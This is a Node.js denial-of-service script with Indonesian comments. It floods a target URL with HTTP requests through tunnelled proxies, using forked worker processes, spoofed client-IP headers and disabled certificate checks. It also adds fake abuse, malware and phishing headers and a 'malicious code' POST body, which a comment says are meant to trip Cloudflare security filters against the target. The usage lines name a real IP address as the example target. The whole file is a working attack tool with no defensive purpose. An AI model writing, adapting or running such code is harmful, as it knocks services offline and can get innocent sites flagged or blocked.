const net = require('net');
const tls = require('tls');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');

// Config
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];

// Validasi input
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.log('Usage: node gjqu2.js GET http://157.230.125.239/ 60 10 100 proxy.txt');
    console.log('Usage: node gjqu2.js GET https://157.230.125.239/ 60 10 100 proxy.txt');
    process.exit(1);
}

const url = new URL(target);
const isHTTPS = url.protocol === 'https:';
const defaultPort = isHTTPS ? 443 : 80;
const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n').filter(p => p.trim());

// Headers untuk HTTP
const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
];

const acceptHeaders = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
];

// Fungsi untuk generate random IP
function generateRandomIP() {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

function getRandomUserAgent() {
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function getRandomAccept() {
    return acceptHeaders[Math.floor(Math.random() * acceptHeaders.length)];
}

function buildHTTPRequest() {
    const userAgent = getRandomUserAgent();
    const accept = getRandomAccept();
    
    let request = `${reqmethod} ${url.pathname}${url.search || ''} HTTP/1.1\r\n` +
                   `Host: ${url.hostname}\r\n` +
                   `User-Agent: ${userAgent}\r\n` +
                   `Accept: ${accept}\r\n` +
                   `Accept-Language: en-US,en;q=0.9\r\n` +
                   `Accept-Encoding: gzip, deflate\r\n` +
                   `Connection: keep-alive\r\n` +
                   `Cache-Control: no-cache\r\n` +
                   `X-Forwarded-For: ${generateRandomIP()}\r\n` +
                   `X-Real-IP: ${generateRandomIP()}\r\n` +
                   `X-Originating-IP: ${generateRandomIP()}\r\n` +
                   `X-Remote-IP: ${generateRandomIP()}\r\n` +
                   `X-Remote-Addr: ${generateRandomIP()}\r\n` +
                   `X-Client-IP: ${generateRandomIP()}\r\n` +
                   `CF-Connecting-IP: ${generateRandomIP()}\r\n` +
                   `True-Client-IP: ${generateRandomIP()}\r\n` +
                   `X-Abuse-Report: malicious_content_detected\r\n` +
                   `X-Malware-Scan: infected\r\n` +
                   `X-Phishing-Report: confirmed\r\n` +
                   `X-Security-Violation: true\r\n` +
                   `X-Content-Abuse: violation_detected\r\n` +
                   `X-Trustwave-Report: malicious\r\n` +
                   `X-Cloudflare-Abuse: high_risk\r\n` +
                   `Referer: ${url.hostname}\r\n` +
                   `Content-Type: application/x-www-form-urlencoded\r\n` +
                   `X-Requested-With: XMLHttpRequest\r\n` +
                   `Origin: ${url.hostname}\r\n`;
    
    // Header khusus untuk memicu filter keamanan Cloudflare/pages.dev
    if (isHTTPS) {
        request += `Upgrade-Insecure-Requests: 1\r\n` +
                   `X-SSL-Protocol: TLSv1.0\r\n` +
                   `X-Forwarded-Proto: http\r\n` +
                   `X-Forwarded-Port: 80\r\n`;
    }
    
    // Tambahkan payload mencurigakan dalam body untuk POST requests
    if (reqmethod === 'POST') {
        const maliciousPayload = `cmd=echo+"+malicious+code+"&submit=1`;
        request += `Content-Length: ${maliciousPayload.length}\r\n\r\n` +
                   `${maliciousPayload}`;
    } else {
        request += `\r\n`;
    }
    
    return Buffer.from(request);
}

const httpPayload = buildHTTPRequest();

function attack() {
    try {
        const proxyLine = proxy[Math.floor(Math.random() * proxy.length)];
        const [proxyHost, proxyPort] = proxyLine.split(':');
        
        if (!proxyHost || !proxyPort) return;
        
        const socket = net.connect(Number(proxyPort), proxyHost, () => {
            // Kirim CONNECT request ke proxy untuk tunneling
            const connectRequest = `CONNECT ${url.hostname}:${url.port || defaultPort} HTTP/1.1\r\n` +
                                 `Host: ${url.hostname}:${url.port || defaultPort}\r\n` +
                                 `Proxy-Connection: Keep-Alive\r\n` +
                                 `\r\n`;
            
            socket.write(connectRequest);
            
            let responseBuffer = '';
            socket.on('data', (data) => {
                responseBuffer += data.toString();
                
                // Jika proxy merespon dengan 200 Connected
                if (responseBuffer.includes('200 Connection established') || 
                    responseBuffer.includes('200 Connected')) {
                    
                    let targetSocket = socket;
                    
                    // Jika HTTPS, buat koneksi TLS melalui tunnel
                    if (isHTTPS) {
                        targetSocket = tls.connect({
                            socket: socket,
                            host: url.hostname,
                            port: url.port || 443,
                            rejectUnauthorized: false // Ignore SSL certificate errors
                        });
                        
                        targetSocket.on('secureConnect', () => {
                            startSendingRequests(targetSocket);
                        });
                        
                        targetSocket.on('error', (error) => {
                            targetSocket.destroy();
                            setTimeout(attack, 100);
                        });
                    } else {
                        startSendingRequests(targetSocket);
                    }
                }
            });
            
            socket.on('error', (error) => {
                socket.destroy();
                setTimeout(attack, 100);
            });
            
            socket.on('close', () => {
                setTimeout(attack, 100);
            });
        });
        
        socket.on('error', (error) => {
            socket.destroy();
            setTimeout(attack, 100);
        });
        
    } catch (error) {
        setTimeout(attack, 100);
    }
}

function startSendingRequests(socket) {
    function sendRequest() {
        if (socket.destroyed) {
            setTimeout(attack, 100);
            return;
        }
        
        socket.write(httpPayload, (err) => {
            if (!err) {
                setTimeout(sendRequest, 1000 / ratelimit);
            } else {
                socket.destroy();
                setTimeout(attack, 100);
            }
        });
    }
    
    sendRequest();
}

// Cluster setup
if (cluster.isMaster) {
    console.log(`Starting attack on ${target}`);
    console.log(`Protocol: ${isHTTPS ? 'HTTPS' : 'HTTP'}`);
    console.log(`Time: ${time}s, Threads: ${threads}, Rate: ${ratelimit}/s`);
    
    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }
    
    cluster.on('exit', (worker) => {
        cluster.fork();
    });
    
    setTimeout(() => {
        console.log('Attack finished');
        process.exit(0);
    }, time * 1000);
    
} else {
    // Worker process
    let connectionCount = 0;
    
    const attackInterval = setInterval(() => {
        if (connectionCount < 1000) {
            connectionCount++;
            attack();
        }
    }, 10);
    
    setTimeout(() => {
        clearInterval(attackInterval);
        process.exit(0);
    }, time * 1000);
}